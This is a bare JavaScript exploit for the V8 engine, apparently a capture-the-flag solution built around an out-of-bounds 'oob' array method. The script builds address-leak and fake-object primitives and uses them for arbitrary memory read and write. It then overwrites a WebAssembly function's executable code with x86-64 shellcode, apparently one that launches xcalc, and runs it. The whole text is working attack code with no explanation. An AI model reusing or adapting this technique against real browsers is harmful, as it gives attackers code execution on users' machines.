var buf = new ArrayBuffer(0x10);
var float64 = new Float64Array(buf)
var bigUint64 = new BigUint64Array(buf)

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(n)
{
    return n.toString(16).padStart(16, "0");
}

var floatArray = [1.1];
var obj = {"a":1.1};
var objArray = [obj];

var floatMap = floatArray.oob();
var objMap = objArray.oob();

function addressOf(obj)
{
    objArray[0] = obj;
    objArray.oob(floatMap);
    let addr = f2i(objArray[0]) - 1n;
    objArray.oob(objMap);
    return addr
}

function objOf(addr)
{
    floatArray[0] = i2f(addr + 1n);
    floatArray.oob(objMap);
    let obj = floatArray[0];
    floatArray.oob(floatMap);
    return obj
}

var fake_array = [
    floatMap,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x1000000000n)
]

fake_array_addr = addressOf(fake_array);
fake_obj_addr = fake_array_addr + 0x20n + 0x10n;
fake_obj = objOf(fake_obj_addr);

function write(addr, data)
{
    fake_array[2] = i2f(addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log("[+] write 0x" + hex(data) + " to 0x" + hex(addr));
}

function read(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 1n);
    let data = f2i(fake_obj[0]);
    console.log("[+] read from 0x" + hex(addr) + " get 0x" + hex(data));
    return data;
}

var wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80,
    0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
    0x00, 0x01, 0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00,
    0x00, 0x05, 0x83, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81,
    0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02,
    0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61,
    0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84,
    0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a, 0x0b
]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var func = wasmInstance.exports.main;

var shared_info_addr = read(addressOf(func) + 0x18n) - 1n;
var wasm_exported_function_data_addr = read(shared_info_addr + 8n) - 1n;
var wasm_instance_addr = read(wasm_exported_function_data_addr + 0x10n) - 1n;
var code_addr = read(wasm_instance_addr + 0x88n);
console.log("[+] wasm code address 0x" + hex(code_addr));

var buffer = new ArrayBuffer(0x100);
var data_view = new DataView(buffer);
var data_view_addr = addressOf(data_view);

var shellcode = new Uint8Array([
    0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48,
    0xb8, 0x2e, 0x79, 0x62, 0x60, 0x6d, 0x62, 0x01, 0x01, 0x48, 0x31, 0x04,
    0x24, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50,
    0x48, 0x89, 0xe7, 0x68, 0x3b, 0x31, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01,
    0x01, 0x01, 0x01, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59,
    0x3d, 0x50, 0x31, 0xd2, 0x52, 0x6a, 0x08, 0x5a, 0x48, 0x01, 0xe2, 0x52,
    0x48, 0x89, 0xe2, 0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
    0x01, 0x50, 0x48, 0xb8, 0x79, 0x62, 0x60, 0x6d, 0x62, 0x01, 0x01, 0x01,
    0x48, 0x31, 0x04, 0x24, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01,
    0xe6, 0x56, 0x48, 0x89, 0xe6, 0x6a, 0x3b, 0x58, 0x0f, 0x05
]);

var backing_store_addr = read(data_view_addr + 0x18n) + 0x20n - 1n;
console.log("[+] backing_store_addr 0x" + hex(backing_store_addr));
write(backing_store_addr, code_addr);

for(var i = 0;i < shellcode.length; i++)
{
    data_view.setUint8(i, shellcode[i], true);
}
func();